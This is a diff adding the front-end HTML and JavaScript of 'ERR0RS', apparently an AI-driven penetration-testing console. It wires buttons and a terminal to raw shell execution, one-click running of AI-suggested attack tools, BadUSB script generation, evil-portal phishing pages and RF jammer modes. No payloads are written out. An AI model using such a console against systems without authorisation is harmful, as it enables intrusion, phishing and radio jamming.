+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('volatility3')" oncontextmenu="event.preventDefault();openToolPanel('volatility3')" title="Click: Tool Anatomy Panel — process forensics">
+        <div class="tb-icon">⚙️</div><div class="tb-name">VOLATILITY</div><div class="tb-cat">SOC/FORENSICS</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('zeek')" oncontextmenu="event.preventDefault();openToolPanel('zeek')" title="Click: Tool Anatomy Panel — live log analysis">
+        <div class="tb-icon">📋</div><div class="tb-name">ZEEK</div><div class="tb-cat">SOC/SIEM</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('suricata')" oncontextmenu="event.preventDefault();openToolPanel('suricata')" title="Click: Tool Anatomy Panel — privilege audit">
+        <div class="tb-icon">🔐</div><div class="tb-name">SURICATA</div><div class="tb-cat">SOC/IPS</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('bettercap')" oncontextmenu="event.preventDefault();openToolPanel('bettercap')" title="Click: Tool Anatomy Panel — firewall/network">
+        <div class="tb-icon">🛡️</div><div class="tb-name">BETTERCAP</div><div class="tb-cat">SOC/MITM</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('theHarvester')" oncontextmenu="event.preventDefault();openToolPanel('theHarvester')" title="Click: Tool Anatomy Panel — OSINT users">
+        <div class="tb-icon">👁️</div><div class="tb-name">HARVESTER</div><div class="tb-cat">SOC/OSINT</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('linpeas')" oncontextmenu="event.preventDefault();openToolPanel('linpeas')" title="Click: Tool Anatomy Panel — persistence/cron audit">
+        <div class="tb-icon">⏰</div><div class="tb-name">LINPEAS</div><div class="tb-cat">SOC/PRIVESC</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <!-- BOTH / SHARED -->
+      <div class="tb both" onclick="openToolPanel('badusb')" oncontextmenu="event.preventDefault();openToolPanel('badusb')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">💾</div><div class="tb-name">BADUSB</div><div class="tb-cat">HID</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb both" onclick="openToolPanel('flipper')" oncontextmenu="event.preventDefault();openToolPanel('flipper')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🐬</div><div class="tb-name">FLIPPER</div><div class="tb-cat">RF/NFC</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb both" onclick="openToolPanel('villain')" oncontextmenu="event.preventDefault();openToolPanel('villain')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">👿</div><div class="tb-name">VILLAIN</div><div class="tb-cat">C2</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb both" onclick="openToolPanel('bloodhound')" oncontextmenu="event.preventDefault();openToolPanel('bloodhound')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🧠</div><div class="tb-name">BLOODHOUND</div><div class="tb-cat">AD/GRAPH</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb both" onclick="openToolPanel('flipper')" oncontextmenu="event.preventDefault();openToolPanel('flipper')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🐬</div><div class="tb-name">FLIPPER LAB</div><div class="tb-cat">RF/NFC/IR</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('autopsy')" oncontextmenu="event.preventDefault();openToolPanel('autopsy')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🎯</div><div class="tb-name">AUTOPSY</div><div class="tb-cat">SIMULATE</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('crackmapexec')" oncontextmenu="event.preventDefault();openToolPanel('crackmapexec')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">📜</div><div class="tb-name">CRACKMAPEXEC</div><div class="tb-cat">SOC2/PCI</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb both" onclick="openToolPanel('err0rs-brain')" oncontextmenu="event.preventDefault();openToolPanel('err0rs-brain')" title="Click: Tool Anatomy Panel — ERR0RS Local AI">
+        <div class="tb-icon">🧠</div><div class="tb-name">ERR0RS AI</div><div class="tb-cat">LOCAL AI</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+    </div>
+    <div id="term-row">
+      <span class="t-prompt-lbl">ERR0RS@phoenix:~$&nbsp;</span>
+      <input id="term-input" type="text" autocomplete="off" spellcheck="false" placeholder="enter command or ask ERR0RS anything..."/>
+      <button id="btn-open-term" onclick="openLiveTerm()" title="Open Live Terminal">⚡ LIVE TERM</button>
+    </div>
+  </div>
+
+</div><!-- /app -->
+
+<!-- ══ MODE BANNER ══ -->
+<div id="mode-banner"></div>
+
+<!-- ══ SMART WIZARD PANEL ══ -->
+<div id="wizard-panel">
+  <!-- content injected by JS showWizard() -->
+</div>
+
+<!-- ══ TARGET MODAL — pops up on tool button click ══ -->
+<div id="target-modal" style="display:none;position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.75);backdrop-filter:blur(4px);align-items:center;justify-content:center;">
+  <div style="background:#0c0020;border:1px solid var(--neon);border-radius:10px;padding:24px 28px;min-width:360px;max-width:520px;box-shadow:0 0 40px rgba(191,111,255,.3);">
+    <div style="font-family:'Orbitron',monospace;font-size:.7rem;letter-spacing:3px;color:var(--neon);margin-bottom:14px;" id="target-modal-label">ENTER TARGET</div>
+    <input id="target-modal-input" type="text" autocomplete="off" spellcheck="false"
+      style="width:100%;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:5px;padding:8px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.8rem;outline:none;margin-bottom:14px;"
+      placeholder="192.168.1.1"/>
+    <div style="display:flex;gap:8px;justify-content:flex-end;">
+      <button onclick="closeTargetModal()"
+        style="padding:5px 14px;border-radius:4px;border:1px solid var(--text-dim);color:var(--text-dim);background:transparent;cursor:pointer;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:.65rem;letter-spacing:1px;">
+        CANCEL
+      </button>
+      <button onclick="submitTargetModal()"
+        style="padding:5px 16px;border-radius:4px;border:1px solid var(--neon);color:var(--neon);background:rgba(191,111,255,.12);cursor:pointer;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:.65rem;letter-spacing:1px;">
+        ⚡ RUN
+      </button>
+    </div>
+    <div style="margin-top:10px;font-size:.58rem;color:var(--text-dim);">Press Enter to run • Esc to cancel</div>
+  </div>
+</div>
+
+<!-- ══ LIVE TERMINAL PANEL (WebSocket streaming) ══ -->
+<div id="live-term-panel">
+  <div id="ltp-header">
+    <div id="ltp-title">LIVE TERMINAL // ERR0RS INTERACTIVE OPERATOR CONSOLE</div>
+    <div style="display:flex;gap:8px;align-items:center;">
+      <span class="ltp-badge idle" id="ltp-status-badge">⬤ CONNECTING</span>
+      <span class="ltp-badge" id="ltp-teach-indicator" style="border-color:var(--amber);color:var(--amber);display:none;">📚 TEACH MODE</span>
+      <span id="ltp-mode-badge" style="font-size:10px;padding:2px 8px;border:1px solid #7b2fbe;border-radius:10px;color:#a855f7;cursor:pointer" onclick="toggleBeginner()" title="Toggle beginner/expert mode">🔰 GUIDED</span>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center;">
+      <span id="ltp-close" onclick="closeLiveTerm()" title="Close terminal">✕</span>
+    </div>
+  </div>
+  <div id="ltp-output"></div>
+  <div id="ltp-input-row">
+    <span id="ltp-prompt">ERR0RS@kali:~$ </span>
+    <input id="ltp-input" type="text" autocomplete="off" spellcheck="false"
+           placeholder="type command... add --teach for inline education... Ctrl+C to stop tool"/>
+    <button class="ltp-btn" id="btn-teach-toggle" onclick="toggleTeachMode()" title="Toggle inline education">📚 TEACH OFF</button>
+    <button class="ltp-btn" id="btn-ctrlc" onclick="sendCtrlC()" title="Send Ctrl+C to stop running tool">⬛ CTRL+C</button>
+  </div>
+</div>
+
+<!-- The glowing PAW that slides to buttons -->
+<div id="paw"></div>
+
+<script>
+'use strict';
+// ─────────────────────────────────────────────
+// CLOCK
+// ─────────────────────────────────────────────
+const clockEl = document.getElementById('clock');
+function tick() {
+  clockEl.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
+}
+setInterval(tick, 1000); tick();
+
+// ─────────────────────────────────────────────
+// SPEECH BUBBLE CYCLING
+// ─────────────────────────────────────────────
+const quotes = [
+  "Every port is a door. Every service is a secret.",
+  "Exploits are just features you found first.",
+  "Stay frosty, operator. Recon never sleeps.",
+  "The best offense is a thorough enumeration.",
+  "root@target:~# — that's the goal.",
+  "Knowledge is the most dangerous payload.",
+  "Purple team: hack it, then patch it.",
+  "ERR0RS sees all. ERR0RS knows all.",
+  "Scanning the dark corners of the net...",
+  "Awaiting your next move, operator.",
+];
+let qi = 0;
+const speechEl = document.getElementById('speech');
+speechEl.style.transition = 'opacity .4s';
+
+setInterval(()=>{
+  qi = (qi+1) % quotes.length;
+  speechEl.style.opacity = 0;
+  setTimeout(()=>{ speechEl.textContent = quotes[qi]; speechEl.style.opacity = 1; }, 420);
+}, 7000);
+
+// ─────────────────────────────────────────────
+// STAT BARS
+// ─────────────────────────────────────────────
+function animateBars() {
+  const bars = [
+    {bar:'npu-bar', val:'npu-val', min:5,  max:90},
+    {bar:'ram-bar', val:'ram-val', min:28, max:75},
+    {bar:'net-bar', val:'net-val', min:2,  max:55},
+  ];
+  bars.forEach(b => {
+    const v = Math.floor(Math.random()*(b.max-b.min)+b.min);
+    document.getElementById(b.bar).style.width = v+'%';
+    document.getElementById(b.val).textContent = v+'%';
+  });
+}
+setInterval(animateBars, 3000);
+
+// ─────────────────────────────────────────────
+// INTEL FEED
+// ─────────────────────────────────────────────
+function addIntel(title, body, type='') {
+  const feed = document.getElementById('intel-feed');
+  const card = document.createElement('div');
+  card.className = 'ic ' + type;
+  const ts = new Date().toLocaleTimeString('en-US',{hour12:false});
+  card.innerHTML = `<div class="ic-ts">${ts}</div><div class="ic-ttl">${title}</div><div class="ic-body">${body}</div>`;
+  feed.insertBefore(card, feed.firstChild);
+  // Keep feed trimmed
+  while(feed.children.length > 12) feed.removeChild(feed.lastChild);
+}
+
+// ─── Clickable suggestion card — one-tap next-step execution ─────────────
+function addSuggestionCard(msg) {
+  const feed = document.getElementById('intel-feed');
+  const tool = msg.tool || '?';
+  const args = Array.isArray(msg.args) ? msg.args.join(' ') : '';
+  const reason = msg.reason || '';
+  const conf = Math.round((msg.confidence || 0) * 100);
+  const ts = new Date().toLocaleTimeString('en-US',{hour12:false});
+
+  const card = document.createElement('div');
+  card.className = 'ic suggestion-card';
+  card.style.cssText = `
+    cursor: pointer;
+    border-left: 3px solid var(--cyan);
+    background: linear-gradient(90deg, rgba(0,215,255,.08), rgba(123,47,190,.06));
+    transition: transform .15s, box-shadow .15s, background .15s;
+  `;
+  card.innerHTML = `
+    <div class="ic-ts">${ts}</div>
+    <div class="ic-ttl" style="color:var(--cyan);">
+      ▶ ${tool.toUpperCase()}
+      <span style="float:right;font-size:.55rem;color:var(--purple-hi);letter-spacing:.1em;">
+        ${conf}% CONF · CLICK TO RUN
+      </span>
+    </div>
+    <div class="ic-body" style="color:var(--text);">${reason}</div>
+    <div style="margin-top:4px;padding:3px 6px;background:#08001a;
+                border-radius:3px;font-family:'Share Tech Mono',monospace;
+                font-size:.62rem;color:var(--green);word-break:break-all;">
+      $ ${tool} ${args}
+    </div>
+  `;
+
+  // Hover effect
+  card.addEventListener('mouseenter', () => {
+    card.style.transform = 'translateX(2px)';
+    card.style.boxShadow = '0 0 12px rgba(0,215,255,.4)';
+    card.style.background = 'linear-gradient(90deg, rgba(0,215,255,.16), rgba(123,47,190,.1))';
+  });
+  card.addEventListener('mouseleave', () => {
+    card.style.transform = 'translateX(0)';
+    card.style.boxShadow = 'none';
+    card.style.background = 'linear-gradient(90deg, rgba(0,215,255,.08), rgba(123,47,190,.06))';
+  });
+
+  // Click = fire the suggestion
+  card.addEventListener('click', async () => {
+    card.style.borderLeftColor = 'var(--amber)';
+    card.style.opacity = '.6';
+    card.querySelector('.ic-ttl').innerHTML = `⏳ ${tool.toUpperCase()} <span style="float:right;color:var(--amber);font-size:.55rem;">RUNNING...</span>`;
+    await runSuggestion(tool, msg.args || []);
+  });
+
+  feed.insertBefore(card, feed.firstChild);
+  while(feed.children.length > 12) feed.removeChild(feed.lastChild);
+}
+
+// Fire a suggestion via the operator brain (preserves target, updates state)
+async function runSuggestion(tool, args) {
+  // Build the natural-language equivalent so operator.receive handles it uniformly
+  const cmd = `${tool} ${args.join(' ')}`.trim();
+  await sendToOperator(cmd);
+}
+
+// ─── PAUSE / RESUME ─────────────────────────────────────────────────────
+async function pauseResumeAuto() {
+  const btn = document.getElementById('op-pause-btn');
+  const current = (btn.textContent || '').trim();
+  const isPaused = current.includes('RESUME');
+  const cmd = isPaused ? 'resume' : 'pause';
+  await sendToOperator(cmd);
+  // Immediate optimistic toggle — state poll will confirm
+  if (isPaused) {
+    btn.innerHTML = '⏸ PAUSE';
+    btn.style.color = 'var(--amber)';
+    btn.style.borderColor = 'var(--amber)';
+  } else {
+    btn.innerHTML = '▶ RESUME';
+    btn.style.color = 'var(--green)';
+    btn.style.borderColor = 'var(--green)';
+  }
+}
+
+// ─────────────────────────────────────────────
+// THE MONEY SHOT — ERR0RS "PRESSES" THE BUTTON
+// Lightweight: CSS transition of a glowing orb
+// + ERR0RS image lean + zoom border flash
+// ZERO animation loop overhead
+// ─────────────────────────────────────────────
+const paw = document.getElementById('paw');
+const bgImg = document.getElementById('bg-img');
+const bgFallback = document.getElementById('bg-fallback');
+const zoomBorder = document.getElementById('zoom-border');
+let pawTimer = null;
+
+function launchTool(btnEl, name, icon, msg) {
+  // 1. Get button center position
+  const rect = btnEl.getBoundingClientRect();
+  const btnCX = rect.left + rect.width/2;
+  const btnCY = rect.top  + rect.height/2;
+
+  // 2. Determine if button is left or right of screen center
+  const screenCX = window.innerWidth / 2;
+  const isLeft = btnCX < screenCX;
+
+  // 3. ERR0RS leans toward the button (image tilt)
+  bgImg.className = isLeft ? 'lean-left' : 'lean-right';
+  const svgEl = bgFallback ? bgFallback.querySelector('svg') : null;
+  if (svgEl) {
+    svgEl.style.transition = 'transform .4s ease';
+    svgEl.style.transform = isLeft ? 'rotate(-3deg) translateX(-2%)' : 'rotate(3deg) translateX(2%)';
+  }
+
+  // 4. Zoom border lights up (like ERR0RS is "speaking")
+  zoomBorder.classList.add('speaking');
+
+  // 5. Animate the glowing PAW orb from video area to button
+  const zoomRect = document.getElementById('zoom-main').getBoundingClientRect();
+  const startX = zoomRect.left + zoomRect.width * 0.5;
+  const startY = zoomRect.bottom - 80;
+
+  paw.style.transition = 'none';
+  paw.style.left = startX + 'px';
+  paw.style.top  = startY + 'px';
+  paw.style.opacity = '0';
+
+  paw.offsetHeight;
+  paw.style.transition = 'left .45s cubic-bezier(.34,1.3,.64,1), top .45s cubic-bezier(.34,1.3,.64,1), opacity .3s';
+  paw.style.left = btnCX + 'px';
+  paw.style.top  = btnCY + 'px';
+  paw.style.opacity = '1';
+
+  // 6. Button press effect
+  btnEl.classList.add('pressed');
+
+  // 7. Speech bubble update
+  speechEl.style.opacity = 0;
+  setTimeout(()=>{ speechEl.textContent = msg; speechEl.style.opacity = 1; }, 200);
+
+  // 8. Reset animation after press
+  clearTimeout(pawTimer);
+  pawTimer = setTimeout(()=>{
+    paw.style.left = startX + 'px';
+    paw.style.top  = startY + 'px';
+    paw.style.opacity = '0';
+    bgImg.className = 'lean-none';
+    if (svgEl) { svgEl.style.transform = ''; }
+    setTimeout(()=>{ zoomBorder.classList.remove('speaking'); }, 300);
+    btnEl.classList.remove('pressed');
+  }, 900);
+
+  // 9. Intel feed note
+  addIntel(`⚡ ${name.toUpperCase()} SELECTED`, `Awaiting target input.`, 'warn');
+
+  // 10. *** THE FIX — actually prompt for target & run the tool ***
+  const toolPlaceholders = {
+    'nmap':       '192.168.1.1 or 192.168.1.0/24',
+    'sqlmap':     'http://target.com/page?id=1',
+    'nikto':      'http://target.com or 192.168.1.1',
+    'gobuster':   'http://target.com',
+    'hydra':      '192.168.1.1 (SSH) or http://target.com/login',
+    'subfinder':  'target.com',
+    'nuclei':     'http://target.com',
+    'ffuf':       'http://target.com/FUZZ',
+    'amass':      'target.com',
+    'enum4linux': '192.168.1.1',
+    'hashcat':    'hash.txt or hash_value',
+    'aircrack-ng':'capture.cap or wlan0',
+    'wireshark':  'capture.pcap or interface name',
+    'metasploit': '(press Enter — opens msfconsole)',
+    'villain':    '(press Enter — starts Villain C2)',
+    'evilginx2':  '(press Enter — starts evilginx2)',
+    'flipper':    'describe what you want the Flipper to do',
+    'badusb':     'describe the BadUSB payload to generate',
+    'ai':         'describe the task for the AI agent',
+  };
+  setTimeout(() => showTargetModal(name, toolPlaceholders[name] || `target for ${name}`), 950);
+}
+
+// ─────────────────────────────────────────────
+// API HELPERS
+// ─────────────────────────────────────────────
+async function runCommand(cmd) {
+  try {
+    const res = await fetch('/api/command', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({command: cmd})
+    });
+    return await res.json();
+  } catch(e) { return {stdout:`[ERR0RS] Backend offline: ${e.message}`, status:'error'}; }
+}
+
+async function runShell(cmd, timeout=60) {
+  try {
+    const res = await fetch('/api/shell', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({cmd, timeout})
+    });
+    return await res.json();
+  } catch(e) { return {stdout:`[ERR0RS] Shell error: ${e.message}`, status:'error'}; }
+}
+
+async function getStatus() {
+  try {
+    const res = await fetch('/api/status');
+    return await res.json();
+  } catch(e) { return null; }
+}
+
+async function runBadUSB(action, payload={}) {
+  try {
+    const res = await fetch('/api/badusb', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action, ...payload})
+    });
+    return await res.json();
+  } catch(e) { return {status:'error', error:`BadUSB API offline: ${e.message}`}; }
+}
+
+async function runRocketGod(action, payload={}) {
+  try {
+    const res = await fetch('/api/rocketgod', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action, ...payload})
+    });
+    return await res.json();
+  } catch(e) { return {status:'error', error:`RocketGod API offline: ${e.message}`}; }
+}
+
+// ─────────────────────────────────────────────
+// TERMINAL INPUT HANDLER
+// ─────────────────────────────────────────────
+const termInput = document.getElementById('term-input');
+
+termInput.addEventListener('keydown', async (e) => {
+  if (e.key !== 'Enter') return;
+  const raw = termInput.value.trim();
+  if (!raw) return;
+  termInput.value = '';
+  const cmd = raw.split(' ')[0].toLowerCase();
+
+  // Visual: ERR0RS reacts
+  speechEl.style.opacity = 0;
+  zoomBorder.classList.add('speaking');
+  setTimeout(() => { zoomBorder.classList.remove('speaking'); }, 1200);
+
+  // ── LOCAL COMMANDS ────────────────────────────────────
+  if (cmd === 'clear') {
+    document.getElementById('intel-feed').innerHTML = '';
+    return;
+  }
+
+  if (cmd === 'help') {
+    const h = `COMMANDS:\n  nmap <ip>        — network scan\n  nikto <ip>       — web scan\n  gobuster <url>   — dir fuzz\n  sqlmap <url>     — SQL injection\n  hydra <ip>       — brute force\n  subfinder <dom>  — subdomain enum\n  nuclei <url>     — vuln scan\n  flipper <prompt> — BadUSB / Flipper scripts\n  rg               — RocketGod knowledge base\n  report           — generate pentest report\n  status           — system status\n  $ <cmd>          — raw shell command\n  ! <cmd>          — raw shell command`;
+    speechEl.textContent = 'Help loaded — check intel feed.';
+    speechEl.style.opacity = 1;
+    addIntel('HELP // COMMAND REFERENCE', h, 'info');
+    return;
+  }
+
+  if (cmd === 'status') {
+    const s = await getStatus();
+    if (s) {
+      const msg = `v${s.version} | Ollama:${s.ollama?'ON':'OFF'} | MCP:${s.mcp?'ON':'OFF'} | Shell:${s.shell_access?'FULL':'NO'}`;
+      speechEl.textContent = msg;
+      speechEl.style.opacity = 1;
+      addIntel('SYSTEM STATUS', JSON.stringify(s, null, 2), 'info');
+    } else {
+      addIntel('STATUS ERROR', 'Cannot reach ERR0RS backend. Is the server running?', 'error');
+    }
+    return;
+  }
+
+  // ── ROCKETGOD COMMANDS ────────────────────────────────
+  if (cmd === 'rocketgod' || cmd === 'rg') {
+    const sub = raw.split(' ').slice(1).join(' ').trim();
+
+    if (!sub || sub === 'summary') {
+      const r = await runRocketGod('summary');
+      const repos = r.repos || {};
+      const lines = Object.entries(repos).map(([k,v]) =>
+        `[${String(v.stars).padStart(5)}★] ${k}: ${(v.description||'').slice(0,55)}`
+      ).join('\n');
+      speechEl.textContent = '💀 RocketGod KB — 13 repos loaded';
+      speechEl.style.opacity = 1;
+      addIntel('ROCKETGOD KNOWLEDGE BASE', lines || 'No repos indexed yet', 'success');
+      return;
+    }
+    if (sub === 'jammer' || sub === 'jam') {
+      const r = await runRocketGod('jammer_modes');
+      const out = Object.entries(r.modes || {}).map(([k,v]) => `[${k}] ${v}`).join('\n');
+      addIntel('RF JAMMER MODES — 300-928MHz', out || 'No modes found', 'success');
+      return;
+    }
+    if (sub === 'proto' || sub === 'protopirate' || sub === 'rolling code') {
+      const r = await runRocketGod('protopirate');
+      const protos = (r.protocols || []).join(', ');
+      const feats  = (r.features  || []).map(f => `• ${f}`).join('\n');
+      addIntel('PROTOPIRATE — Rolling Code Analyzer', `Protocols: ${protos}\n\n${feats}`, 'success');
+      return;
+    }
+    if (sub === 'hackrf') {
+      const r = await runRocketGod('hackrf');
+      addIntel('HACKRF TREASURE CHEST', `${r.description||''}\nPath: ${r.path||''}`, 'success');
+      return;
+    }
+    if (sub === 'toolbox' || sub === 'scripts') {
+      const r = await runRocketGod('toolbox');
+      const out = Object.entries(r.scripts || {}).map(([k,v]) => `${k}: ${v}`).join('\n');
+      addIntel('FLIPPER TOOLBOX SCRIPTS', out, 'success');
+      return;
+    }
+    if (sub.startsWith('sub ')) {
+      const cat = sub.slice(4);
+      const r = await runRocketGod('sub_files', {category: cat});
+      const files = (r.files || []).slice(0,20).map(f => f.split(/[\\/]/).pop()).join('\n');
+      addIntel(`SUB FILES [${cat||'all'}] — ${r.count||0} total`, files, 'success');
+      return;
+    }
+    if (sub.startsWith('ir ')) {
+      const dev = sub.slice(3);
+      const r = await runRocketGod('ir_files', {device_type: dev});
+      const files = (r.files || []).slice(0,20).map(f => f.split(/[\\/]/).pop()).join('\n');
+      addIntel(`IR FILES [${dev||'all'}] — ${r.count||0} total`, files, 'success');
+      return;
+    }
+    // Default: keyword search
+    const r = await runRocketGod('search', {prompt: sub});
+    const out = (r.results || []).map(x => `[${x.repo}] ${x.description}`).join('\n');
+    addIntel(`ROCKETGOD SEARCH: ${sub}`, out || 'No results', 'info');
+    return;
+  }
+
+  // ── FLIPPER / BADUSB COMMANDS ─────────────────────────
+  if (cmd === 'flipper' || cmd === 'badusb' || cmd === 'ducky') {
+    const sub = raw.split(' ').slice(1).join(' ').trim();
+
+    if (!sub || sub === 'list') {
+      const r = await runBadUSB('list');
+      const cats = r.categories
+        ? Object.entries(r.categories).map(([k,v]) => `${k}: ${v} scripts`).join('\n')
+        : '';
+      speechEl.textContent = `Flipper KB: ${r.total||0} scripts loaded`;
+      speechEl.style.opacity = 1;
+      addIntel('FLIPPER KNOWLEDGE BASE', `Total: ${r.total||0} scripts\n${cats}`, 'success');
+      return;
+    }
+    if (sub === 'portals') {
+      const r = await runBadUSB('portals');
+      const out = (r.portals || []).map(x => x.title).join(', ');
+      addIntel('EVIL PORTAL PAGES', out, 'success');
+      return;
+    }
+    if (sub.startsWith('search ')) {
+      const q = sub.slice(7);
+      const r = await runBadUSB('search', {prompt: q});
+      const out = (r.results || []).map(x => `[${x.category}] ${x.title} — ${x.desc}`).join('\n');
+      speechEl.textContent = `Found ${r.results?.length||0} scripts for: ${q}`;
+      speechEl.style.opacity = 1;
+      addIntel('FLIPPER SEARCH', out || 'No results', 'info');
+      return;
+    }
+    // Generate script from natural language
+    speechEl.textContent = `⚡ Generating Flipper script: ${sub}`;
+    speechEl.style.opacity = 1;
+    const r = await runBadUSB('generate', {prompt: sub});
+    if (r.script) {
+      addIntel(
+        `FLIPPER SCRIPT GENERATED [${r.template||r.category||'custom'}]`,
+        `${r.description||''}\nFile: ${r.sd_filename||''}\n\n${r.script}`,
+        'success'
+      );
+      speechEl.textContent = `Script ready: ${r.sd_filename||'script.txt'} — drop to SD:/badusb/`;
+      speechEl.style.opacity = 1;
+    } else {
+      addIntel('FLIPPER ERROR', r.error || 'Generation failed', 'error');
+    }
+    return;
+  }
+
+  if (cmd === 'modify') {
+    const parts = raw.slice(7).split('|');
+    if (parts.length >= 2) {
+      const r = await runBadUSB('modify', {script: parts[0].trim(), instructions: parts[1].trim()});
+      addIntel('SCRIPT MODIFIED', `Changes: ${(r.changes||[]).join(', ')}\n\n${r.script||''}`, 'success');
+    } else {
+      addIntel('USAGE', 'modify <script content> | <instructions>', 'info');
+    }
+    return;
+  }
+
+  // ── EXECUTE TOOL / SHELL COMMAND ──────────────────────
+  speechEl.textContent = `⚡ Running: ${raw}...`;
+  speechEl.style.opacity = 1;
+  addIntel(`> ${raw.toUpperCase()}`, 'Executing on Kali...', 'warn');
+
+  let result;
+  if (raw.startsWith('$') || raw.startsWith('!')) {
+    result = await runShell(raw.slice(1).trim());
+  } else {
+    result = await runCommand(raw);
+  }
+
+  const out    = result.stdout || result.error || 'No output';
+  const status = result.status || 'done';
+  const color  = status === 'error' ? 'error' : status === 'timeout' ? 'warn' : 'success';
+  const lines  = out.split('\n').filter(l => l.trim()).slice(0, 25);
+
+  setTimeout(() => {
+    speechEl.textContent = lines[0] || `${cmd} complete`;
+    speechEl.style.opacity = 1;
+  }, 200);
+
+  addIntel(`${raw.toUpperCase()} [${status.toUpperCase()}]`, lines.join('\n'), color);
+
+  if (result.findings && result.findings.length > 0) {
+    const f = result.findings.slice(0,10).map(x => JSON.stringify(x)).join('\n');
+    addIntel(`FINDINGS (${result.findings.length})`, f, 'success');
+  }
+});
+
+// ─────────────────────────────────────────────
+// LIVE TERMINAL — WebSocket engine
+// ─────────────────────────────────────────────
+let ws            = null;
+let wsConnected   = false;
+let teachMode     = false;
+let wsUrl         = null;
+const ltpOutput   = document.getElementById('ltp-output');
+const ltpInput    = document.getElementById('ltp-input');
+const ltpBadge    = document.getElementById('ltp-status-badge');
+const ltpPanel    = document.getElementById('live-term-panel');
+const ltpTeachInd = document.getElementById('ltp-teach-indicator');
+
+// Discover WS port from HTTP API
+async function discoverWS() {
+  try {
+    const r = await fetch('/api/ws_info');
+    const d = await r.json();
+    if (d.ws_available) {
+      wsUrl = d.ws_url;
+      return true;
+    }
+  } catch(e) {}
+  wsUrl = `ws://${location.hostname}:8766`;
+  return false;
+}
+
+function connectWS() {
+  if (ws && wsConnected) return;
+  ws = new WebSocket(wsUrl || `ws://${location.hostname}:8766`);
+
+  ws.onopen = () => {
+    wsConnected = true;
+    ltpBadge.textContent = '⬤ CONNECTED';
+    ltpBadge.className   = 'ltp-badge live';
+    ltpWrite('[ERR0RS] Live terminal connected. Type commands below.', 'system');
+    ltpWrite('[ERR0RS] Add --teach to any command for inline education.', 'system');
+    ltpWrite('[ERR0RS] Press Ctrl+C button to stop running tools.', 'system');
+    ltpWrite('─'.repeat(54), 'system');
+  };
+
+  ws.onmessage = (evt) => {
+    try {
+      const msg = JSON.parse(evt.data);
+      handleWSMessage(msg);
+    } catch(e) {
+      ltpWrite(evt.data, 'output');
+    }
+  };
+
+  ws.onclose = () => {
+    wsConnected = false;
+    ltpBadge.textContent = '⬤ DISCONNECTED';
+    ltpBadge.className   = 'ltp-badge idle';
+    setTimeout(() => { if (ltpPanel.classList.contains('active')) connectWS(); }, 3000);
+  };
+
+  ws.onerror = (e) => {
+    ltpBadge.textContent = '⬤ WS ERROR';
+    ltpBadge.className   = 'ltp-badge idle';
+    ltpWrite('[ERR0RS] WebSocket error — make sure websockets is installed: pip3 install websockets', 'error');
+  };
+}
+
+function handleWSMessage(msg) {
+  switch(msg.type) {
+    case 'output':
+      ltpWrite(msg.data, 'output');
+      // Mirror first line to speech bubble
+      if (msg.data && msg.data.trim()) {
+        const first = msg.data.trim().substring(0, 70);
+        speechEl.style.opacity = 0;
+        setTimeout(() => { speechEl.textContent = first; speechEl.style.opacity = 1; }, 100);
+      }
+      break;
+    case 'teach':
+      ltpWrite(msg.data, 'teach');
+      addIntel('[ERR0RS TEACHES]', msg.data.substring(0,120), 'info');
+      break;
+    case 'intel':
+      // Kill chain / tool events — push to intel feed only (no terminal spam)
+      addIntel(msg.tool || msg.phase || 'ERR0RS', msg.data, msg.success === false ? 'error' : 'info');
+      break;
+    case 'narrator':
+      // ERR0RS natural language commentary — show in live terminal
+      ltpWrite(msg.data, 'system');
